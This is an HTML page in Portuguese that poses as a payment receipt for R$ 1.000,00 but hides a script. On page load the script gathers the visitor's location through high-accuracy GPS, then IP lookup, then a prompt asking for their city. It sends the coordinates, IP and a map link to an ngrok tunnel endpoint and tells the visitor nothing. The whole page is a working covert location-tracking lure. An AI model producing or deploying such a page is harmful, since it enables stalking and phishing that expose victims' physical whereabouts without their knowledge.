<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Comprovante de Recebimento</title>
  <style>
    /* --- Estilos Visuais --- */
    :root {
      --azul: #002776;
      --amarelo: #ffcc00;
    }

    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 20px;
    }

    .comprovante-container {
      max-width: 600px;
      margin: 0 auto;
      background: #fff;
      border: 2px solid var(--azul);
      padding: 25px 30px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    .comprovante-container h1 {
      color: var(--azul);
      font-size: 22px;
      text-align: center;
      margin-bottom: 30px;
      border-bottom: 1px solid #ccc;
      padding-bottom: 10px;
    }

    .informacoes p {
      font-size: 16px;
      margin: 10px 0;
    }

    .informacoes span:first-child {
      font-weight: bold;
      color: var(--azul);
    }

    .informacoes span:last-child {
      color: #333;
    }

    .botao {
      display: block;
      margin: 30px auto;
      background: var(--amarelo);
      color: var(--azul);
      border: none;
      padding: 12px 30px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      border-radius: 4px;
      transition: background 0.3s;
    }

    .botao:hover {
      background: #e6b800;
    }

    .comprovante-footer {
      font-size: 14px;
      color: #666;
      text-align: center;
      border-top: 1px solid #ccc;
      margin-top: 40px;
      padding-top: 15px;
    }

    .comprovante-footer a {
      color: var(--azul);
      text-decoration: none;
      font-weight: bold;
    }

    .comprovante-footer a:hover {
      text-decoration: underline;
    }

    /* --- Estilos de Impressão --- */
    @media print {
      body {
        background: none;
        padding: 0;
      }
      .botao {
        display: none !important;
      }
    }
  </style>
</head>
<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>
  </div>

  <script>
    /* ============================================================
       Script de coleta e envio de localização com múltiplas quedas
       (GPS, IP, e entrada manual) – compatível com Chrome Mobile.
       ============================================================ */

    // Configurações gerais --------------------------------------
    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location"; // Ajuste conforme necessário
    const IP_API_URL = "https://ipapi.co/json/"; // Fallback via IP (HTTPS) – 1000 req/dia

    // Preenche a data no cabeçalho ------------------------------
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("data-atual").textContent = new Intl.DateTimeFormat("pt-BR", {
        dateStyle: "short",
      }).format(new Date());

      obterLocalizacao();
    });

    // Função principal de obtenção de localização ---------------
    async function obterLocalizacao() {
      // 1) Verifica se estamos em contexto seguro (HTTPS)
      if (!window.isSecureContext) {
        console.warn("Contexto não seguro: geolocalização bloqueada. Executando fallback por IP.");
        return obterLocalizacaoPorIP();
      }

      // 2) Verifica permissões, se suportado
      try {
        if (navigator.permissions) {
          const status = await navigator.permissions.query({ name: "geolocation" });
          if (status.state === "denied") {
            console.info("Usuário negou a geolocalização permanentemente. Executando fallback por IP.");
            return obterLocalizacaoPorIP();
          }
        }
      } catch (err) {
        console.debug("API Permissions não disponível: prosseguindo.", err);
      }

      // 3) Se a API de geolocalização existir, tenta obter posição exata
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            await enviarPayload({ latitude, longitude, accuracy, metodo: "gps" });
          },
          (erro) => {
            console.warn("Falha na geolocalização por GPS:", erro);
            obterLocalizacaoPorIP();
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          }
        );
      } else {
        console.warn("API de geolocalização não suportada. Executando fallback por IP.");
        obterLocalizacaoPorIP();
      }
    }

    // Fallback: localização aproximada via IP -------------------
    async function obterLocalizacaoPorIP() {
      try {
        const resp = await fetch(IP_API_URL);
        const data = await resp.json();
        const { latitude: lat, longitude: lon, ip, city, region, country_name } = data;

        await enviarPayload({
          latitude: lat,
          longitude: lon,
          city,
          region,
          country: country_name,
          ip,
          metodo: "ip",
        });
      } catch (err) {
        console.error("Não foi possível obter localização pelo IP:", err);
        solicitarLocalizacaoManual();
      }
    }

    // Último recurso: solicitar inserção manual -----------------
    function solicitarLocalizacaoManual() {
      const cidade = prompt("Não foi possível determinar sua localização automaticamente. Por favor, informe sua cidade:");
      if (!cidade) return; // usuário cancelou
      enviarPayload({ cidadeInformada: cidade, metodo: "manual" });
    }

    // Envia dados ao back-end -----------------------------------
    async function enviarPayload(dados) {
      const payload = {
        ...dados,
        maps: dados.latitude && dados.longitude ? `https://www.google.com/maps?q=${dados.latitude},${dados.longitude}` : undefined,
        timestamp: new Date().toISOString(),
      };

      console.log("Enviando dados de localização:", payload);

      try {
        const resposta = await fetch(BACKEND_ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        const resultado = await resposta.json();
        if (resultado.success) {
          console.info("Localização enviada com sucesso (modo:", payload.metodo, ")");
        } else {
          throw new Error(JSON.stringify(resultado));
        }
      } catch (err) {
        console.error("Falha ao enviar dados de localização:", err);
        alert("Não foi possível enviar sua localização. Por favor, tente novamente mais tarde.");
      }
    }
  </script>
</body>
</html>
